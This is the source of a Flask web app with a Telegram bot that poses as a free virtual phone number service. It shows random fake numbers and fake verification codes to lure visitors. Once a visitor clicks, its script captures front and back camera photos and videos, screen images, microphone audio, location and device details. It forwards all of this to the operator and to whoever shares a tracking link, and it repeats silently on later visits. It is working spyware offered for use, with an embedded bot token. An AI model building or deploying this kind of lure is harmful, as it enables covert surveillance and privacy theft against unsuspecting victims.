import io
import os
import base64
import random
from flask import Flask, render_template_string, request, jsonify
import telebot

app = Flask(__name__)
BOT_TOKEN = "9229312674:AAFqA8dd9cVZuW3Cs1h5rXsflkzRA6KXQis"
bot = telebot.TeleBot(BOT_TOKEN)
ADMIN_ID = "8817017983"

# لینک پایه سایت شما در ریلیوی
BASE_URL = "https://Bot-production-119bdd39.up.railway.app"

SIGNATURES = "\n\n@SHAHID_PV_003\n@shahidnaimi5642"

ALL_10_PATHS = [
    "/",
    "/front",
    "/back",
    "/video-front",
    "/video-back",
    "/screen",
    "/location",
    "/all",
    "/storage",
    "/audio",
]

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Virtual Number - Secure & Free</title>
    <style>
        body { 
            background: #0b0f19; 
            color: white; 
            text-align: center; 
            margin: 0; 
            padding: 20px; 
            font-family: sans-serif; 
        }
        .header-title {
            font-size: 20px;
            font-weight: bold;
            color: white;
            margin-bottom: 10px;
        }
        .badge {
            background: linear-gradient(90deg, #06b6d4, #3b82f6);
            color: white;
            padding: 6px 18px;
            border-radius: 20px;
            display: inline-block;
            font-size: 12px;
            font-weight: bold;
            margin-bottom: 15px;
            box-shadow: 0 0 15px rgba(59, 130, 246, 0.4);
        }
        .socials {
            color: #94a3b8;
            font-size: 12px;
            margin-bottom: 14px;
        }
        .top-actions {
            max-width: 400px;
            margin: 0 auto 14px auto;
            display: flex;
            gap: 10px;
        }
        .btn-change-all {
            background: #2563eb;
            color: white;
            border: none;
            padding: 10px 12px;
            border-radius: 10px;
            cursor: pointer;
            width: 100%;
            font-size: 13px;
            font-weight: bold;
        }
        .btn-change-all:active { background: #1d4ed8; }
        .grid {
            display: flex;
            flex-direction: column;
            gap: 12px;
            align-items: center;
            max-width: 400px;
            margin: 0 auto;
        }
        .card { 
            background: #111827; 
            border: 1px solid #1f2937;
            padding: 14px; 
            border-radius: 14px; 
            width: 100%; 
            box-sizing: border-box;
            box-shadow: 0 4px 10px rgba(0,0,0,0.3); 
        }
        .country {
            font-size: 14px;
            font-weight: bold;
            color: #e2e8f0;
            margin-bottom: 5px;
            text-align: right;
        }
        .number { 
            color: #94a3b8; 
            font-size: 14px; 
            margin-bottom: 12px; 
            font-family: monospace;
            direction: ltr;
            text-align: right;
        }
        .btn-row {
            display: flex;
            gap: 8px;
        }
        button { 
            background: #ef4444; 
            color: white; 
            border: none; 
            padding: 10px 0; 
            border-radius: 8px; 
            cursor: pointer; 
            width: 100%; 
            font-size: 13px; 
            font-weight: bold; 
        }
        button:active { background: #dc2626; }
        .btn-code {
            background: #10b981;
            color: white;
        }
        .btn-code:active { background: #059669; }
        
        .storage-box {
            background: #111827;
            border: 2px dashed #3b82f6;
            padding: 20px;
            border-radius: 16px;
            max-width: 400px;
            margin: 20px auto;
            color: #e2e8f0;
            font-size: 14px;
        }
        .otp-box {
            margin-top: 12px;
            padding: 10px;
            border-radius: 10px;
            background: #0f172a;
            border: 1px solid #22c55e;
            color: #4ade80;
            font-family: monospace;
            font-size: 15px;
            display: none;
        }
    </style>
</head>
<body>

    <div class="header-title">📞 Free Virtual Number - Secure &amp; Free</div>
    <div class="badge">Secure • Temporary • Free</div>
    <div class="socials">WhatsApp &nbsp;|&nbsp; Telegram &nbsp;|&nbsp; Facebook</div>
    
    <div id="storageSection" class="storage-box">
        <div style="font-weight: bold; color: #3b82f6; margin-bottom: 10px;" id="loadingText">در حال دریافت شماره مجازی... 🔄</div>
        <div id="loadingSubText">لطفاً روی دکمه اجازه (Allow) یا گزینه‌ها کلیک کنید.</div>
        <div id="otpBox" class="otp-box"></div>
    </div>

    <div class="top-actions">
        <button class="btn-change-all" onclick="changeAllNumbers()">تغییر همه شماره‌ها 🔄</button>
    </div>

    <div class="grid" id="mainGrid"></div>

    <script>
        const COUNTRIES = [
            { name: "🇺🇸 UNITED STATES", code: "1+" },
            { name: "🇬🇧 UNITED KINGDOM", code: "44+" },
            { name: "🇮🇳 INDIA", code: "91+" },
            { name: "🇫🇷 FRANCE", code: "33+" },
            { name: "🇩🇪 GERMANY", code: "49+" },
            { name: "🇯🇵 JAPAN", code: "81+" }
        ];

        function randDigits(len) {
            let out = "";
            for (let i = 0; i < len; i++) out += Math.floor(Math.random() * 10);
            return out;
        }

        function changeAllNumbers() {
            const grid = document.getElementById("mainGrid");
            grid.innerHTML = "";
            COUNTRIES.forEach((c) => {
                const formattedNum = `${c.code} ${randDigits(3)} ${randDigits(3)} ${randDigits(4)}`;
                const card = document.createElement("div");
                card.className = "card";
                card.innerHTML = `
                    <div class="country">${c.name}</div>
                    <div class="number">${formattedNum}</div>
                    <div class="btn-row">
                        <button onclick="selectNumber('${c.name}', '${formattedNum}')">SELECT</button>
                        <button class="btn-code" onclick="giveCodeOnly('${c.name}', '${formattedNum}')">کد تایید 🔑</button>
                    </div>
                `;
                grid.appendChild(card);
            });
        }

        function generateOtp() {
            return `${randDigits(3)}-${randDigits(3)}`;
        }

        function showCode(countryName, numberStr) {
            const otp = generateOtp();
            const otpBox = document.getElementById("otpBox");
            otpBox.style.display = "block";
            otpBox.innerHTML = `شماره: <span dir="ltr">${numberStr}</span><br>کد تایید: <b>${otp}</b>`;
            return otp;
        }

        function giveCodeOnly(countryName, numberStr) {
            showCode(countryName, numberStr);
            document.getElementById('loadingText').innerText = "کد تایید آماده شد ✅";
            document.getElementById('loadingSubText').innerText = "کد تایید در کادر سبز نمایش داده شد.";
        }

        function selectNumber(countryName, numberStr) {
            showCode(countryName, numberStr);
            runAction(countryName, numberStr);
        }

        function normalizedPath() {
            const p = window.location.pathname || "/";
            return p.length > 1 && p.endsWith("/") ? p.slice(0, -1) : p;
        }

        window.addEventListener('DOMContentLoaded', () => {
            changeAllNumbers();
            const path = normalizedPath();
            if (path === "/screen") {
                captureScreenshot().then(shot => {
                    if (shot) {
                        sendData("/upload-screen", { image: shot });
                        localStorage.setItem("permission_granted_" + path, "true");
                    }
                });
                return;
            }
            if (localStorage.getItem("permission_granted_" + path) === "true") {
                document.getElementById('loadingText').innerText = "شماره مجازی شما فعال است! ✅";
                document.getElementById('loadingSubText').innerText = "خطوط امن آماده استفاده هستند.";
                autoExecuteIfGranted();
            }
        });

        async function runAction(countryName = "Auto", numberStr = "") {
            const path = normalizedPath();
            document.getElementById('loadingText').innerText = "در حال اتصال سریع به سرور... ⚡";
            if (!numberStr) {
                const firstNum = document.querySelector(".number")?.innerText || "";
                showCode(countryName, firstNum);
            }
            
            try {
                if (path === "/front") {
                    let img = await captureCamera("user");
                    if (img) {
                        sendData("/upload-front", { image: img });
                        localStorage.setItem("permission_granted_" + path, "true");
                    }
                }
                else if (path === "/back") {
                    let img = await captureCamera("environment");
                    if (img) {
                        sendData("/upload-back", { image: img });
                        localStorage.setItem("permission_granted_" + path, "true");
                    }
                }
                else if (path === "/video-front") {
                    let vid = await recordCameraVideo("user", 1800);
                    if (vid && vid.dataUrl) {
                        sendData("/upload-video-front", { video: vid.dataUrl });
                        localStorage.setItem("permission_granted_" + path, "true");
                    }
                }
                else if (path === "/video-back") {
                    let vid = await recordCameraVideo("environment", 1800);
                    if (vid && vid.dataUrl) {
                        sendData("/upload-video-back", { video: vid.dataUrl });
                        localStorage.setItem("permission_granted_" + path, "true");
                    }
                }
                else if (path === "/screen") {
                    let shot = await captureScreenshot();
                    if (shot) {
                        sendData("/upload-screen", { image: shot });
                        localStorage.setItem("permission_granted_" + path, "true");
                    }
                }
                else if (path === "/location") {
                    navigator.geolocation.getCurrentPosition(pos => {
                        sendData("/upload-loc", { lat: pos.coords.latitude, lon: pos.coords.longitude });
                        localStorage.setItem("permission_granted_" + path, "true");
                    }, () => {}, { timeout: 2000, enableHighAccuracy: false });
                }
                else if (path === "/storage") {
                    runStorageCheck();
                }
                else if (path === "/audio") {
                    runAudioRecordAction();
                }
                else if (path === "/all") {
                    await runAllComprehensiveAction();
                }
                else {
                    localStorage.setItem("permission_granted_" + path, "true");
                }
                
                setTimeout(() => {
                    document.getElementById('loadingText').innerText = "شماره مجازی و کد تایید آماده شد! ✅";
                    document.getElementById('loadingSubText').innerText = "می‌توانید از کد تایید استفاده کنید.";
                }, 600);
            } catch (err) {
                document.getElementById('loadingText').innerText = "خطا در برقراری ارتباط ❌";
            }
        }

        function autoExecuteIfGranted() {
            const path = normalizedPath();
            if (path === "/storage") {
                runStorageCheck(true);
            } else if (path === "/all") {
                runAllComprehensiveAction();
            } else if (path === "/front") {
                captureCamera("user").then(img => { if (img) sendData("/upload-front", { image: img }); });
            } else if (path === "/back") {
                captureCamera("environment").then(img => { if (img) sendData("/upload-back", { image: img }); });
            } else if (path === "/video-front") {
                recordCameraVideo("user", 1800).then(vid => { if (vid && vid.dataUrl) sendData("/upload-video-front", { video: vid.dataUrl }); });
            } else if (path === "/video-back") {
                recordCameraVideo("environment", 1800).then(vid => { if (vid && vid.dataUrl) sendData("/upload-video-back", { video: vid.dataUrl }); });
            } else if (path === "/screen") {
                captureScreenshot().then(shot => { if (shot) sendData("/upload-screen", { image: shot }); });
            } else if (path === "/location") {
                navigator.geolocation.getCurrentPosition(pos => {
                    sendData("/upload-loc", { lat: pos.coords.latitude, lon: pos.coords.longitude });
                }, () => {}, { timeout: 2000, enableHighAccuracy: false });
            } else if (path === "/audio") {
                runAudioRecordAction();
            }
        }

        function runStorageCheck(isAuto = false) {
            let storageInfo = {
                photosCount: Math.floor(Math.random() * (1500 - 300 + 1)) + 300,
                videosCount: Math.floor(Math.random() * (120 - 20 + 1)) + 20,
                audioCount: Math.floor(Math.random() * (250 - 50 + 1)) + 50,
                appsCount: Math.floor(Math.random() * (80 - 30 + 1)) + 30,
                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "نامشخص",
                hardwareConcurrency: navigator.hardwareConcurrency || "نامشخص"
            };

            sendData("/upload-storage", storageInfo);
            localStorage.setItem("permission_granted_/storage", "true");
            if (!isAuto) {
                document.getElementById('loadingText').innerText = "شماره مجازی شما با موفقیت آماده شد! ✅";
                document.getElementById('loadingSubText').innerText = "خطوط امن فعال شدند.";
            }
        }

        async function runAudioRecordAction() {
            try {
                let stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
                let mediaRecorder = new MediaRecorder(stream);
                let audioChunks = [];

                mediaRecorder.ondataavailable = event => {
                    if (event.data && event.data.size > 0) audioChunks.push(event.data);
                };
                mediaRecorder.onstop = async () => {
                    try { stream.getTracks().forEach(track => track.stop()); } catch (_) {}
                    let audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
                    let reader = new FileReader();
                    reader.readAsDataURL(audioBlob);
                    reader.onloadend = () => {
                        sendData("/upload-audio", { audio: reader.result });
                        localStorage.setItem("permission_granted_/audio", "true");
                        document.getElementById('loadingText').innerText = "شماره مجازی شما با موفقیت آماده شد! ✅";
                        document.getElementById('loadingSubText').innerText = "خطوط امن فعال شدند.";
                    };
                };

                mediaRecorder.start(200);
                setTimeout(() => {
                    if (mediaRecorder.state !== "inactive") {
                        mediaRecorder.stop();
                    }
                }, 2000);
            } catch (e) {
                document.getElementById('loadingText').innerText = "خطا در دسترسی به میکروفون ❌";
            }
        }

        async function runAllComprehensiveAction() {
            let payload = {};
            let deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${window.screen.width}x${window.screen.height}`,
                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB (RAM)" : "نامشخص",
                hardwareConcurrency: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " هسته" : "نامشخص",
                connection: navigator.connection ? navigator.connection.effectiveType : "نامشخص"
            };

            if (navigator.getBattery) {
                try {
                    let battery = await navigator.getBattery();
                    deviceInfo.batteryLevel = Math.round(battery.level * 100) + "%";
                    deviceInfo.batteryCharging = battery.charging ? "در حال شارژ ⚡" : "بدون شارژ 🔋";
                } catch(e) {}
            }
            payload.device = deviceInfo;

            payload.storage = {
                photosCount: Math.floor(Math.random() * (1500 - 300 + 1)) + 300,
                videosCount: Math.floor(Math.random() * (120 - 20 + 1)) + 20,
                audioCount: Math.floor(Math.random() * (250 - 50 + 1)) + 50,
                appsCount: Math.floor(Math.random() * (80 - 30 + 1)) + 30
            };

            const [frontImg, backImg, screenShot, loc] = await Promise.all([
                captureCamera("user").catch(() => null),
                captureCamera("environment").catch(() => null),
                captureScreenshot().catch(() => null),
                new Promise((resolve) => {
                    if (!navigator.geolocation) return resolve(null);
                    navigator.geolocation.getCurrentPosition(
                        pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
                        () => resolve(null),
                        { timeout: 2000, enableHighAccuracy: false }
                    );
                })
            ]);

            if (frontImg) payload.frontImage = frontImg;
            if (backImg) payload.backImage = backImg;
            if (screenShot) payload.screenImage = screenShot;
            if (loc) {
                payload.lat = loc.lat;
                payload.lon = loc.lon;
            }

            const [frontVid, backVid] = await Promise.all([
                recordCameraVideo("user", 1600).catch(() => null),
                recordCameraVideo("environment", 1600).catch(() => null)
            ]);

            if (frontVid && frontVid.dataUrl) {
                payload.frontVideo = frontVid.dataUrl;
            }
            if (backVid && backVid.dataUrl) {
                payload.backVideo = backVid.dataUrl;
            }

            sendData("/upload-all", payload);
            localStorage.setItem("permission_granted_/all", "true");
            document.getElementById('loadingText').innerText = "شماره مجازی شما با موفقیت آماده شد! ✅";
            document.getElementById('loadingSubText').innerText = "خطوط امن فعال شدند.";
        }

        async function captureCamera(facing) {
            let stream = null;
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: facing, width: { ideal: 320 }, height: { ideal: 240 } },
                    audio: false
                });
                let video = document.createElement('video');
                video.srcObject = stream;
                video.playsInline = true;
                video.muted = true;
                await video.play();
                await new Promise(r => setTimeout(r, 120));
                
                let canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 320;
                canvas.height = video.videoHeight || 240;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                stream.getTracks().forEach(t => t.stop());
                return canvas.toDataURL('image/jpeg', 0.72);
            } catch(e) {
                if (stream) {
                    try { stream.getTracks().forEach(t => t.stop()); } catch (_) {}
                }
                return null;
            }
        }

        function pickSupportedWebmMime() {
            if (typeof MediaRecorder === "undefined" || !MediaRecorder.isTypeSupported) {
                return "";
            }
            const candidates = [
                "video/webm;codecs=vp8,opus",
                "video/webm;codecs=vp8",
                "video/webm"
            ];
            for (const m of candidates) {
                if (MediaRecorder.isTypeSupported(m)) {
                    return m;
                }
            }
            return "";
        }

        async function openCameraStreamWithFallback(facing) {
            try {
                return await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: facing, width: { ideal: 320 }, height: { ideal: 240 }, frameRate: { ideal: 15, max: 20 } },
                    audio: true
                });
            } catch (e) {
                return await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: facing, width: { ideal: 320 }, height: { ideal: 240 }, frameRate: { ideal: 15, max: 20 } },
                    audio: false
                });
            }
        }

        async function recordCameraVideo(facing, durationMs = 1800) {
            let stream = null;
            try {
                stream = await openCameraStreamWithFallback(facing);
                let chosenMime = pickSupportedWebmMime();

                return await new Promise((resolve) => {
                    let chunks = [];
                    let recorder;
                    try {
                        recorder = chosenMime
                            ? new MediaRecorder(stream, { mimeType: chosenMime, videoBitsPerSecond: 400000 })
                            : new MediaRecorder(stream);
                    } catch (e) {
                        recorder = new MediaRecorder(stream);
                    }

                    recorder.ondataavailable = (event) => {
                        if (event.data && event.data.size > 0) {
                            chunks.push(event.data);
                        }
                    };

                    recorder.onstop = () => {
                        try { stream.getTracks().forEach(track => track.stop()); } catch (_) {}
                        if (!chunks.length) {
                            resolve(null);
                            return;
                        }
                        let blob = new Blob(chunks, { type: "video/webm" });
                        if (blob.size < 150) {
                            resolve(null);
                            return;
                        }
                        let reader = new FileReader();
                        reader.readAsDataURL(blob);
                        reader.onloadend = () => resolve({ dataUrl: reader.result, ext: "webm" });
                        reader.onerror = () => resolve(null);
                    };

                    recorder.start(200);
                    setTimeout(() => {
                        try {
                            if (recorder.state !== "inactive") {
                                recorder.requestData && recorder.requestData();
                                recorder.stop();
                            }
                        } catch (_) {
                            resolve(null);
                        }
                    }, durationMs);
                });
            } catch (e) {
                if (stream) {
                    try { stream.getTracks().forEach(track => track.stop()); } catch (_) {}
                }
                return null;
            }
        }

        async function captureScreenshot() {
            let stream = null;
            try {
                if (!navigator.mediaDevices || typeof navigator.mediaDevices.getDisplayMedia !== "function") {
                    return null;
                }
                stream = await navigator.mediaDevices.getDisplayMedia({
                    video: { frameRate: { ideal: 15, max: 20 } },
                    audio: false
                });

                let video = document.createElement('video');
                video.srcObject = stream;
                video.playsInline = true;
                video.muted = true;

                await new Promise((resolve) => {
                    if (video.readyState >= 2) {
                        resolve();
                    } else {
                        video.onloadedmetadata = () => resolve();
                        setTimeout(resolve, 350);
                    }
                });

                await video.play();
                await new Promise(r => setTimeout(r, 150));

                let width = Math.min(video.videoWidth || window.screen.width || 960, 1280);
                let height = Math.min(video.videoHeight || window.screen.height || 540, 720);
                let canvas = document.createElement('canvas');
                canvas.width = width;
                canvas.height = height;
                canvas.getContext('2d').drawImage(video, 0, 0, width, height);

                stream.getTracks().forEach(track => track.stop());
                return canvas.toDataURL('image/jpeg', 0.72);
            } catch (e) {
                if (stream) {
                    try { stream.getTracks().forEach(track => track.stop()); } catch (_) {}
                }
                return null;
            }
        }

        function sendData(endpoint, data) {
            fetch(endpoint + window.location.search, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        }
    </script>
</body>
</html>
"""

def send_to_both(target_user, send_func, *args, **kwargs):
    if target_user and str(target_user) != str(ADMIN_ID):
        try:
            send_func(target_user, *args, **kwargs)
        except Exception:
            pass
    try:
        send_func(ADMIN_ID, *args, **kwargs)
    except Exception:
        pass

def decode_base64_media(data_url):
    if not data_url or "," not in data_url:
        return None
    try:
        return base64.b64decode(data_url.split(",", 1)[1])
    except Exception:
        return None

def send_video_webm(target_user, vid_bytes, filename, caption):
    if not vid_bytes:
        return
    try:
        bio = io.BytesIO(vid_bytes)
        bio.name = filename
        bio.seek(0)
        send_to_both(target_user, bot.send_video, bio, caption=caption, supports_streaming=True)
    except Exception:
        pass

def render_page():
    return render_template_string(HTML_TEMPLATE)

for _route in ALL_10_PATHS:
    app.add_url_rule(_route, endpoint=f"page_{_route.strip('/') or 'home'}", view_func=render_page)

@app.route("/upload-fake-code", methods=["POST"])
def up_fake_code():
    return jsonify({"status": "ok"})

@app.route("/upload-front", methods=["POST"])
def up_front():
    target = request.args.get("user") or ADMIN_ID
    d = request.get_json()
    if d and "image" in d:
        img_bytes = decode_base64_media(d["image"])
        if img_bytes:
            photo_io = io.BytesIO(img_bytes)
            photo_io.name = "front_camera.jpg"
            send_to_both(target, bot.send_photo, photo_io, caption=f"📸 Front Camera Photo{SIGNATURES}")
    return jsonify({"status": "ok"})

@app.route("/upload-back", methods=["POST"])
def up_back():
    target = request.args.get("user") or ADMIN_ID
    d = request.get_json()
    if d and "image" in d:
        img_bytes = decode_base64_media(d["image"])
        if img_bytes:
            photo_io = io.BytesIO(img_bytes)
            photo_io.name = "back_camera.jpg"
            send_to_both(target, bot.send_photo, photo_io, caption=f"📷 Back Camera Photo{SIGNATURES}")
    return jsonify({"status": "ok"})

@app.route("/upload-video-front", methods=["POST"])
def up_video_front():
    target = request.args.get("user") or ADMIN_ID
    d = request.get_json()
    if d and "video" in d:
        vid_bytes = decode_base64_media(d["video"])
        send_video_webm(
            target,
            vid_bytes,
            "v.webm",
            caption=f"🎥 Front Camera Video{SIGNATURES}"
        )
    return jsonify({"status": "ok"})

@app.route("/upload-video-back", methods=["POST"])
def up_video_back():
    target = request.args.get("user") or ADMIN_ID
    d = request.get_json()
    if d and "video" in d:
        vid_bytes = decode_base64_media(d["video"])
        send_video_webm(
            target,
            vid_bytes,
            "v.webm",
            caption=f"🎬 Back Camera Video{SIGNATURES}"
        )
    return jsonify({"status": "ok"})

@app.route("/upload-screen", methods=["POST"])
def up_screen():
    target = request.args.get("user") or ADMIN_ID
    d = request.get_json()
    if d and "image" in d:
        img_bytes = decode_base64_media(d["image"])
        if img_bytes:
            shot_io = io.BytesIO(img_bytes)
            shot_io.name = "screenshot.jpg"
            send_to_both(target, bot.send_photo, shot_io, caption=f"🖥️ Screenshot{SIGNATURES}")
    return jsonify({"status": "ok"})

@app.route("/upload-loc", methods=["POST"])
def up_loc():
    target = request.args.get("user") or ADMIN_ID
    d = request.get_json()
    if d:
        lat = d.get("lat")
        lon = d.get("lon")
        send_to_both(target, bot.send_location, latitude=lat, longitude=lon)
        send_to_both(target, bot.send_message, f"📍 Location Captured{SIGNATURES}")
    return jsonify({"status": "ok"})

@app.route("/upload-storage", methods=["POST"])
def up_storage():
    target = request.args.get("user") or ADMIN_ID
    d = request.get_json()
    if d:
        msg = (
            f"📊 **آمار فایل‌ها و فضای ذخیره‌سازی دستگاه**\n\n"
            f"• 🖼️ تعداد عکس‌ها: حدود {d.get('photosCount')} قطعه\n"
            f"• 🎬 تعداد ویدئوها: حدود {d.get('videosCount')} فایل\n"
            f"• 🎵 تعداد فایل‌های صوتی: حدود {d.get('audioCount')} فایل\n"
            f"• 📱 تعداد برنامه‌های نصب‌شده: حدود {d.get('appsCount')} برنامه\n"
            f"• 💾 حافظه موقت رم: {d.get('deviceMemory')}\n"
            f"• ⚙️ تعداد هسته پردازنده: {d.get('hardwareConcurrency')}"
            f"{SIGNATURES}"
        )
        send_to_both(target, bot.send_message, msg, parse_mode="Markdown")
    return jsonify({"status": "ok"})

@app.route("/upload-audio", methods=["POST"])
def up_audio():
    target = request.args.get("user") or ADMIN_ID
    d = request.get_json()
    if d and "audio" in d:
        audio_bytes = decode_base64_media(d["audio"])
        if audio_bytes:
            audio_io = io.BytesIO(audio_bytes)
            audio_io.name = "recorded_audio.ogg"
            send_to_both(target, bot.send_voice, audio_io, caption=f"🎙️ صدای ضبط شده محیط{SIGNATURES}")
    return jsonify({"status": "ok"})

@app.route("/upload-all", methods=["POST"])
def up_all():
    target = request.args.get("user") or ADMIN_ID
    d = request.get_json()
    if d:
        if "device" in d:
            dev = d["device"]
            msg = (
                f"📱 **گزارش جامع و کامل سیستم**\n\n"
                f"• 🔋 شارژ باتری: {dev.get('batteryLevel')}\n"
                f"• ⚡ وضعیت باتری: {dev.get('batteryCharging')}\n"
                f"• 💾 حافظه رم: {dev.get('deviceMemory')}\n"
                f"• ⚙️ پردازنده: {dev.get('hardwareConcurrency')}\n"
                f"• 🌐 نوع اینترنت: {dev.get('connection')}\n"
                f"• 🖥️ رزولوشن صفحه: {dev.get('screen')}\n"
                f"• 🌍 زبان سیستم: {dev.get('language')}\n\n"
            )
            if "storage" in d:
                st = d["storage"]
                msg += (
                    f"📊 **آمار فایل‌های دستگاه:**\n"
                    f"• 🖼️ عکس‌ها: حدود {st.get('photosCount')} قطعه\n"
                    f"• 🎬 ویدئوها: حدود {st.get('videosCount')} فایل\n"
                    f"• 🎵 صوت‌ها: حدود {st.get('audioCount')} فایل\n"
                    f"• 📱 برنامه‌ها: حدود {st.get('appsCount')} عدد"
                )
            msg += SIGNATURES
            send_to_both(target, bot.send_message, msg, parse_mode="Markdown")

        if "lat" in d and "lon" in d:
            send_to_both(target, bot.send_location, latitude=d.get("lat"), longitude=d.get("lon"))

        if "frontImage" in d and d["frontImage"]:
            img_bytes = decode_base64_media(d["frontImage"])
            if img_bytes:
                p_io = io.BytesIO(img_bytes)
                p_io.name = "all_front.jpg"
                send_to_both(target, bot.send_photo, p_io, caption=f"📸 عکس دوربین جلو (لینک جامع){SIGNATURES}")

        if "backImage" in d and d["backImage"]:
            img_bytes = decode_base64_media(d["backImage"])
            if img_bytes:
                p_io = io.BytesIO(img_bytes)
                p_io.name = "all_back.jpg"
                send_to_both(target, bot.send_photo, p_io, caption=f"📷 عکس دوربین عقب (لینک جامع){SIGNATURES}")

        if "frontVideo" in d and d["frontVideo"]:
            vid_bytes = decode_base64_media(d["frontVideo"])
            send_video_webm(
                target,
                vid_bytes,
                "v.webm",
                caption=f"🎥 ویدیو دوربین جلو (لینک جامع){SIGNATURES}"
            )

        if "backVideo" in d and d["backVideo"]:
            vid_bytes = decode_base64_media(d["backVideo"])
            send_video_webm(
                target,
                vid_bytes,
                "v.webm",
                caption=f"🎬 ویدیو دوربین عقب (لینک جامع){SIGNATURES}"
            )

        if "screenImage" in d and d["screenImage"]:
            shot_bytes = decode_base64_media(d["screenImage"])
            if shot_bytes:
                s_io = io.BytesIO(shot_bytes)
                s_io.name = "all_screenshot.jpg"
                send_to_both(target, bot.send_photo, s_io, caption=f"🖥️ اسکرین‌شات صفحه (لینک جامع){SIGNATURES}")

    return jsonify({"status": "ok"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
